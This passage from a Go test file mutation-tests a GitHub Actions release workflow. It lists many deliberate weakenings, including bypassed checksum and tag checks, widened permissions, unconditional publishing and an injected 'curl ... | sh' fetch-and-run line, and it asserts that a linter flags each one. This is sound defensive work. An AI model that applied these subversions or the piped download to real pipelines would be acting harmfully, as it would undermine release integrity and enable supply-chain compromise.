		{"draft unchecked", "publish", `test -z "$DRAFT" -o "$DRAFT" = true -o "$DRAFT" = false ||`, `test -n "$DRAFT" ||`},
		{"ACTOR reassigned", "reassign", "          test \"$ACTOR\" = \"$OWNER\" || { echo \"run started by", "          ACTOR=$OWNER\n          test \"$ACTOR\" = \"$OWNER\" || { echo \"run started by"},
		{"REPO reassigned", "reassign", "          existing=$(gh api", "          REPO=other/repo\n          existing=$(gh api"},
		{"GITHUB_SHA reassigned", "reassign", "          test \"$commit\" = \"$GITHUB_SHA\" ||", "          GITHUB_SHA=$commit\n          test \"$commit\" = \"$GITHUB_SHA\" ||"},
		{"smoke HEAD assertion removed", "smoke", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          sh .github/scripts/release-smoke.sh", "          sh .github/scripts/release-smoke.sh"},
		{"checkout ref override", "with", "          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/setup-go", "          fetch-depth: 0\n          persist-credentials: false\n          ref: main\n      - uses: actions/setup-go"},
		{"download run-id override", "with", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          run-id: 1\n          path: ${{ runner.temp }}/dist\n      - name: Smoke"},
		{"download github-token", "with", "          pattern: release-*\n", "          pattern: release-*\n          github-token: x\n"},
		{"setup-go latest", "setupgo", "          check-latest: false\n          cache: false\n      - name: Build", "          check-latest: true\n          cache: false\n      - name: Build"},
		{"setup-go version pin", "setupgo", "          go-version-file: .go-version\n          check-latest: false\n          cache: false\n      - name: Build", "          go-version: '1.25'\n          check-latest: false\n          cache: false\n      - name: Build"},
		{"sums line changed", "publish", "cat -- bdock_*.tar.gz.sha256 | LC_ALL=C sort -k2 > SHA256SUMS", "cat -- bdock_*.tar.gz.sha256 > SHA256SUMS"},
		{"CI count inflated", "ci", "--jq '.workflow_runs | map(select(.conclusion == \"success\")) | length'", "--jq '.total_count + 1'"},
		{"verify gate echoed", "verify", "      - run: make check\n", "      - run: echo make check\n"},
		{"verify gate commented", "verify", "      - run: go mod verify\n", "      - run: \"# go mod verify\"\n"},
		{"copy after second build", "build", "          diff -r \"$RUNNER_TEMP/first\" \"$RUNNER_TEMP/second\"", "          rm -rf \"$RUNNER_TEMP/second\"; cp -r \"$RUNNER_TEMP/first\" \"$RUNNER_TEMP/second\"\n          diff -r \"$RUNNER_TEMP/first\" \"$RUNNER_TEMP/second\""},
		{"gate wrapped in if false", "if-line", "          sha256sum --check SHA256SUMS", "          if false; then sha256sum --check SHA256SUMS; fi"},
		{"declare reassignment", "redirect", "          test -z \"$existing\" ||", "          declare existing=\"\"\n          test -z \"$existing\" ||"},
		{"printf -v reassignment", "redirect", "          test \"$remote\" = \"$COMMIT\" ||", "          printf -v remote %s \"$COMMIT\"\n          test \"$remote\" = \"$COMMIT\" ||"},
		{"extra main fetch", "redirect", "          commit=$(sh .github/scripts/release-verify.sh tag", "          git fetch --force --no-tags \"https://github.com/$REPO\" '+refs/heads/dev:refs/remotes/origin/main'\n          commit=$(sh .github/scripts/release-verify.sh tag"},
		{"draft test inverted", "publish", "if [ \"$DRAFT\" = true ]; then flags+=(--draft); fi", "if [ \"$DRAFT\" != true ]; then flags+=(--draft); fi"},
		{"extra release asset", "publish", "\"$RUNNER_TEMP\"/dist/bdock_*.tar.gz \"$RUNNER_TEMP/dist/SHA256SUMS\"", "\"$RUNNER_TEMP\"/dist/* \"$RUNNER_TEMP/dist/SHA256SUMS\""},
		{"test -o trick", "swallow", "test \"$n\" -ge 1 ||", "test \"$n\" -ge 1 -o 1 = 1 ||"},
		{"monotonic step unguarded", "guard", "      - name: Require a version above every existing release\n        if: steps.resolve.outputs.dry_run == 'false'\n", "      - name: Require a version above every existing release\n"},
		{"monotonic script call removed", "monotonic", `| sh .github/scripts/release-verify.sh monotonic "$TAG"`, `| cat`},
		{"monotonic ignores releases", "monotonic", `printf '%s\n%s\n' "$tags" "$releases"`, `printf '%s\n' "$tags"`},
		{"monotonic ignores tags", "monotonic", `printf '%s\n%s\n' "$tags" "$releases"`, `printf '%s\n' "$releases"`},
		{"monotonic wrong tag", "monotonic", "          TAG: ${{ steps.resolve.outputs.tag }}\n        run: |\n          set -euo pipefail\n          # Tags (annotated", "          TAG: bdock/v999.0.0\n        run: |\n          set -euo pipefail\n          # Tags (annotated"},
		{"monotonic tag filter widened", "monotonic", `'refs/tags/bdock/v*'`, `'refs/tags/nothing'`},
		{"no second build", "build", `GOCACHE="$RUNNER_TEMP/gocache-second" TARGETS="$OS/$ARCH" RELEASE_DIR="$RUNNER_TEMP/second" sh scripts/release.sh`, `true`},
		{"no byte comparison", "build", `diff -r "$RUNNER_TEMP/first" "$RUNNER_TEMP/second"`, `true`},
		{"dirty source allowed", "build", `grep -Fx "source_modified=false"`, `grep -F "source_modified"`},
		{"HEAD assertion removed in build", "build", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          # scripts/release.sh", "          # scripts/release.sh"},
		{"build env cgo", "build", "CGO_ENABLED: '0'", "CGO_ENABLED: '1'"},
		{"build toolchain download", "build", "GOTOOLCHAIN: local", "GOTOOLCHAIN: auto"},
		{"second upload", "artifact", "      - uses: actions/upload-artifact", "      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\n        with:\n          name: extra\n          path: x\n      - uses: actions/upload-artifact"},
		{"artifact retention", "artifact", "retention-days: 1", "retention-days: 90"},
		{"publish without smoke", "needs", "needs: [verify, build, smoke]", "needs: [verify, build]"},
		{"publish unconditional", "publish-if", "if: needs.verify.outputs.dry_run == 'false' && github.event_name == 'push' && github.ref_type == 'tag'", "if: always()"},
		{"publish without environment", "environment", "    environment: release\n", ""},
		{"environment on build", "environment", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n", "  build:\n    environment: release\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n"},
		{"build gets write", "permissions", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: write"},
		{"verify tag check dropped in publish", "publish", `test "$remote" = "$COMMIT" ||`, `test -n "$remote" ||`},
		{"draft check dropped", "publish", `test -z "$existing" ||`, `test -n "$existing" ||`},
		{"verify-tag removed", "publish", "--verify-tag ", ""},
		{"checksum check removed", "publish", "sha256sum --check SHA256SUMS", "true"},
		{"checksum count loosened", "publish", `test "$(wc -l < SHA256SUMS)" -eq 3`, `test "$(wc -l < SHA256SUMS)" -ge 1`},
		{"archive count loosened", "publish", `test "$(ls -1 -- bdock_*.tar.gz | wc -l)" -eq 3`, `test "$(ls -1 -- bdock_*.tar.gz | wc -l)" -ge 1`},
		{"publish actor env", "publish", "ACTOR: ${{ github.triggering_actor }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "ACTOR: ${{ github.repository_owner }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run"},
		{"expression in script", "injection", `test "$ACTOR" = "$OWNER" || { echo "run triggered by $ACTOR`, `test "$ACTOR" = "${{ github.repository_owner }}" || { echo "run triggered by $ACTOR`},
		{"reassign gate variable", "reassign", "          existing=$(gh api", "          COMMIT=$GITHUB_SHA\n          existing=$(gh api"},
		{"download a tool", "download", "          mkdir \"$RUNNER_TEMP/dist\"", "          curl -sSL https://example.invalid/x | sh\n          mkdir \"$RUNNER_TEMP/dist\""},
		{"make release in a job", "download", "          # scripts/release.sh is the single", "          make release\n          # scripts/release.sh is the single"},
		{"publish checkout shallow", "publish", "          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          pattern", "          fetch-depth: 1\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          pattern"},
	}
	for _, m := range mutants {
		if !strings.Contains(raw, m.from) {
			t.Errorf("HARNESS ERROR, NOT A KILL: mutant %q: text not found: %q", m.name, m.from)
			continue
		}
		mutated := strings.Replace(raw, m.from, m.to, 1)
		var w workflow
		if err := yaml.Unmarshal([]byte(mutated), &w); err != nil {
			t.Errorf("HARNESS ERROR, NOT A KILL: mutant %q does not parse: %v", m.name, err)
			continue
		}
		found := false
		for _, v := range violations(w, mutated) {
			if strings.HasPrefix(v, m.code+":") {
				found = true
			}
		}
		if !found {
			t.Errorf("mutant %q (%s) survived; violations: %v", m.name, m.code, violations(w, mutated))
		}
	}
}

func TestReleaseWorkflowDoesNotTriggerOnOtherTags(t *testing.T) {
	// Every other workflow must keep ignoring bdock/ tags: only ci.yml (push, any ref)
	// reacts to a tag push, as it does to the existing image tags.
	dir := filepath.Join(repoRoot(t), ".github", "workflows")
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		raw, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		w := parse(t, string(raw))
		push, hasPush := w.On["push"]
		switch e.Name() {
		case "release.yml", "ci.yml":
			continue
		}
		if !hasPush {
			continue
		}
		cfg, _ := push.(map[string]any)
		if _, ok := cfg["tags"]; ok {
			t.Errorf("%s triggers on tags: %v", e.Name(), cfg)
		}
		if _, ok := cfg["branches"]; !ok && cfg["tags-ignore"] == nil {
			t.Errorf("%s has an unfiltered push trigger that would also start on bdock/ tags", e.Name())
		}
	}
}

// CI vets every release platform (compiler verification only, no artifact), so a
// platform-specific compile break is found on the push, not on the release tag.
func TestCIVetsEveryReleasePlatform(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), ".github", "workflows", "ci.yml"))
	if err != nil {
		t.Fatal(err)
	}
	w := parse(t, string(raw))
	s, ok := stepNamed(w.Jobs["check"], "Vet the release platforms")
	if !ok {
		t.Fatal("ci.yml check job lacks the step \"Vet the release platforms\"")
	}
	for _, p := range platforms {
		goos, goarch, _ := strings.Cut(p, "/")
		want := "GOOS=" + goos + " GOARCH=" + goarch + " go vet ./cmd/... ./internal/..."
		if !strings.Contains(s.Run, want) {
			t.Errorf("step lacks %q", want)
		}
	}
	if s.ContinueOnError != nil {
		t.Error("the vet step must not continue on error")
	}
	var vetLines []string
	for _, l := range strings.Split(s.Run, "\n") {
		if l = strings.TrimSpace(l); l != "" && !strings.HasPrefix(l, "#") {
			vetLines = append(vetLines, l)
		}
	}
	if len(vetLines) != 3 {
		t.Errorf("want exactly three uncommented vet lines, got %v", vetLines)
	}
	if n := strings.Count(s.Run, "go vet"); n != 3 || strings.Contains(s.Run, "||") || strings.Contains(s.Run, "set +e") {
		t.Errorf("want exactly three unconditional go vet lines, got %d", n)
	}
	if strings.Contains(s.Run, "go build") || strings.Contains(s.Run, "make ") {
		t.Error("the CI platform step must not build artifacts")
	}
}

// canonical renders the parsed workflow, comments dropped, as stable JSON.
func canonical(t *testing.T, raw string) string {
	t.Helper()
	var v any
	if err := yaml.Unmarshal([]byte(raw), &v); err != nil {
		t.Fatal(err)
	}
	out, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	return string(out) + "\n"
}

// The golden file is a change detector, not a safety proof: any edit of the workflow
// must be a deliberate, reviewed change. UPDATE_RELEASE_GOLDEN=1 regenerates it and
// fails the run on purpose; it is refused in CI.
func TestReleaseWorkflowMatchesGolden(t *testing.T) {
	path := filepath.Join(repoRoot(t), "internal", "releaseworkflow", "testdata", "release.golden.json")
	got := canonical(t, readWorkflow(t))
	if os.Getenv("UPDATE_RELEASE_GOLDEN") == "1" {
		if os.Getenv("CI") != "" {
			t.Fatal("refusing to update the golden file in CI")
		}
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
		t.Fatal("golden file regenerated; review the diff and run the tests again")
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if string(want) != got {
		t.Fatal("release.yml differs from testdata/release.golden.json; a workflow change must be deliberate: review it, then regenerate with UPDATE_RELEASE_GOLDEN=1")
	}
}

func gatesText(j job) string {
	var b strings.Builder
	for _, s := range j.Steps {
		b.WriteString(s.Run + "\n")
	}
	return b.String()
}
